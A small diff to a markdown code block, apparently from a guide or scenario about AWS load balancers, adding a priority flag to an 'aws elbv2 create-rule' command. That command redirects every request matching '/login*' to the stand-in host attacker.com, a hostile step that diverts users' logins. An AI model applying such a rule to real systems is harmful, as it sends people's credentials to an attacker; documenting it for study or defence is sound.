@@ -161,6 +161,7 @@ aws elbv2 register-targets \\
 ```bash
 aws elbv2 create-rule \\
   --listener-arn <arn> \\
+  --priority 10 \\
   --conditions Field=path-pattern,Values='/login*' \\
   --actions Type=redirect,RedirectConfig='{
     Host=attacker.com,StatusCode=HTTP_302}'
